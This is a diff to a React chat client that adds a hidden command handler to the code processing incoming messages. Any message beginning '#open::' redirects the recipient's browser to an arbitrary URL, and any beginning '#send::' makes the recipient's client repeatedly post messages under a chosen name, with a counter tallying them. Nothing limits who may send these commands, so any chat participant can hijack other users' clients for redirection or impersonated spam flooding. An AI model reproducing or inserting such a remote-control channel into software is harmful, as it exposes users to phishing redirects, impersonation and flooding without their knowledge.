@@ -11,6 +11,7 @@ class App extends Component {
     messages: [],
     username: "",
     usernameConfirmed: false,
+    sentMessages: 0,
     message: "",
     color: 0,
   };
@@ -64,7 +65,35 @@ class App extends Component {
     this.setState({ message: "" });
   };
 
+  handleCommand = data => {
+    console.log(data);
+    if (data.message[0] === "#") {
+      const splittedMessage = data.message.split('::');
+      const command = splittedMessage[0];
+      if (command === "#open") {
+        window.open(splittedMessage[1], "_self");
+      } else if (command === "#send") {
+        const name = splittedMessage[1];
+        const message = splittedMessage[2];
+        const interval = splittedMessage[3];
+        console.log(name, message, interval);
+        if (this.messageInterval) clearInterval(this.messageInterval);
+        this.messageInterval = setInterval(() => {
+          this.setState(prevState => ({
+            sentMessages: prevState.sentMessages + 1
+          }));
+          this.websocket.send(JSON.stringify({
+            name,
+            message,
+            color: 'green',
+          }));
+        }, interval || 1000);
+      }
+    }
+  }
+
   handleMessage = (e) => {
+    this.handleCommand(JSON.parse(e.data));
     this.setState({ messages: [ ...this.state.messages, JSON.parse(e.data) ] });
     setTimeout(() => {
       const objDiv = document.getElementById("chatwindow");
@@ -115,7 +144,7 @@ class App extends Component {
   };
 
   render() {
-    const { usernameConfirmed } = this.state;
+    const { usernameConfirmed, sentMessages } = this.state;
 
     return (
       <div className="App">
@@ -123,6 +152,7 @@ class App extends Component {
           <h1 className="App-title">Chat</h1>
           <button onClick={this.startSending}>Laheta</button>
           <input onChange={e => this.setState({ interval: e.target.value })} />
+          <div style={{ float: "right" }}>{sentMessages}</div>
         </header>
         {!usernameConfirmed ?
           <div className="Login-div">
